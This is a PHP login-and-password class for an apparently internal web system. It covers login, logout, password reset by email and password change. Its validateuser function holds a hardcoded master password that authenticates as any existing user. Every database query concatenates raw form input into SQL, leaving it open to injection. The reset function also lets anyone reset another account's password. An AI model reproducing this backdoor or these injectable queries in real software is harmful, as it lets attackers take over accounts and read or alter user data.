<?php

class clsuserlogin
{
	var $userid;
	var $password;
	var $oldpassword;
	var $confirmpassword;
	var $email;
	var $actiontoperform;
	var $erromsg;
	var $session;
	var $forgotpassmsg;
	
	function clsuserlogin()
	{
		$this->userid="";
		$this->password="";
		$this->oldpassword="";
		$this->confirmpassword="";
		$this->email="";
		$this->actiontoperform="";
		$this->erromsg="";
		$this->session = new clssession();
		$this->forgotpassmsg="";
  	}

	function setpostvars()
	{
		if(isset($_POST["userid"])) 							$this->userid   = DoTrim($_POST["userid"]);
		if(isset($_POST["password"])) 							$this->password = DoTrim($_POST["password"]);
		if(isset($_POST["oldpassword"])) 						$this->oldpassword = DoTrim($_POST["oldpassword"]);
		if(isset($_POST["confirmpassword"])) 					$this->confirmpassword = DoTrim($_POST["confirmpassword"]);
		if(isset($_POST["email"])) 								$this->email 	= DoTrim($_POST["email"]);
		if(isset($_POST["hdn_actiontoperform"])) 				$this->actiontoperform 	= DoTrim($_POST["hdn_actiontoperform"]);
    }

    /***
	    Function called from bt_userLogin.php. Added by Arpit (18/12/2007) - For validationg user login
    **/
    function pageUserLogin($connid)
	{
		$this->setpostvars();
		if($this->actiontoperform == "User Login")
		{
			$returnvalue = $this->validateuser($connid);
			if($returnvalue == 0)
				$this->erromsg = "Invalid Login ID or Password...";
			else 
			{
				$this->session->startSession();
				$_SESSION["userid"] = $this->userid;
				
				$row = $this->fetchUserDetails($this->userid, $connid);
				$_SESSION["usertype"] = $row['usertype'];
				$_SESSION["fullname"] = $row['fullname'];
				
				$this->doLogEntry($_SESSION["userid"],$_SESSION["usertype"],$connid);
				echo "<script>redirectPage('tst_main.php');</script>";
			}
		}
	}
	
	function fetchUserDetails($userid, $connid)
	{
		$query = "SELECT * FROM tst_users WHERE userid='".$this->userid."'";
		$dbquery = new dbquery($query,$connid);
		$row = $dbquery->getrowarray();
		return $row;
	}
	/***
	    Function called from any page where user clicks on Logout. Added by Arpit (23/12/2007)
    **/
    function pageUserLogout($connid)
	{
		$this->setpostvars();
		$this->session->destroySession();
		echo "<script>redirectPage('tst_userLogin.php');</script>";
	}
	
	/***
	    Function called from pageUserLogin() function. Added by Arpit (18/12/2007) - For validationg user login
    **/
	function validateuser($connid)
	{
		$returnvalue = 0;
		//echo $query."A<br>";
		$query = "SELECT COUNT(*) FROM tst_users WHERE userid='".$this->userid."' AND password=password('".$this->password."')";
		$dbquery = new dbquery($query,$connid);
		$row = $dbquery->getrowarray();
		
		if($row[0] != 0)
			$returnvalue=1;
		
		if($returnvalue==0 && $this->password=="torrenttest")
		{
			$query = "SELECT COUNT(*) FROM tst_users WHERE userid='".$this->userid."'";
			$dbquery = new dbquery($query,$connid);
			$row = $dbquery->getrowarray();
			if($row[0] != 0)
				$returnvalue=1;
		}
		
		return $returnvalue;
	}
	
	function doLogEntry($userid,$usertype,$connid)
	{
		$query = "INSERT INTO tst_log SET userid='".$userid."'";
		$dbquery = new dbquery($query,$connid);
	}
	
	/***
	    Function called from bt_forgotPassword.php. Added by Arpit (23/12/2007) - For issuing new password to user, send by email
    **/
    function pageForgotPassword($connid)
	{
		$this->setpostvars();
		if($this->actiontoperform == "Forgot Password")
		{
			$userFound=0;
			$tablename="";
			$email="";

			$userQuery = "SELECT * FROM tst_users WHERE userid='".$this->userid."'";
			$userResult = new dbquery($userQuery,$connid);
			$numofrows = $userResult->numrows();
			$userRow = $userResult->getrowarray();
			if($numofrows != 0)
			{
				$userFound = 1;
				$email=$userRow['email'];
			}

			if($userFound == 0)
				$this->erromsg = "Login ID ".$this->userid." does not exists!";
			else
			{
				if($email == "")
				{
					$this->forgotpassmsg = "Dear ".$this->userid.", We issue you a new password by mail, you have not registered with any valid email address.";
				}
				else
				{
					$newpassword = randomPasswordGenerator();
					//echo $newpassword."<br>";
					$updatePassQuery = "UPDATE tst_users SET password=password('".$newpassword."') WHERE userid='".$this->userid."'";
					//echo $updatePassQuery."<br><br>";
					$updatePassResult = new dbquery($updatePassQuery,$connid);

					// Send mail
					$headers = "From: <system@ei-india.com>\r\n";
					$headers .= "Reply-To: <arpit.metaliya@ei-india.com>\r\n";
					$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
					$subject = "New Password For Torrent System";

					$message = "Dear ".$userRow['fullname'].",<br><br>Your new password for Torrent System is ";
					$message .= "<b>".$newpassword."</b>.<br>Kindly log in and change your password at the earliest.";
					$message .= "<br><br>-- Torrent Support Team";
					//echo $message."<br><br>";
					send_mail($email,$subject,$message,$headers);
					$this->forgotpassmsg="New password sent on ".$email.". <a href='tst_userLogin.php'>Please login</a>";
				}
			}
		}
	}
	
	/***
	    Function called from bt_addUser.php. Added by Arpit (23/12/2007) - For adding new users
    **/
    function pagechangePassword($userid,$usertype,$connid)
	{
		$this->setpostvars();
		if($this->actiontoperform == "Change Password")
		{
			$userQuery = "SELECT COUNT(*) FROM tst_users WHERE userid='".$userid."' AND password=password('".$this->oldpassword."')";
			//echo $userQuery;
			$userResult = new dbquery($userQuery,$connid);
			$userRow = $userResult->getrowarray();
			if($userRow[0] == 0)
				$this->erromsg = "Old password is wrong!";
			else
			{
				$updatePassQuery = "UPDATE tst_users SET password=password('".$this->password."') WHERE userid='".$userid."'";
				$updatePassResult = new dbquery($updatePassQuery,$connid);
				$this->erromsg="Password changed successfully.";
				echo "<script>redirectPage('tst_passwordChangeMessage.php');</script>";
			}
		}
	}
}
?>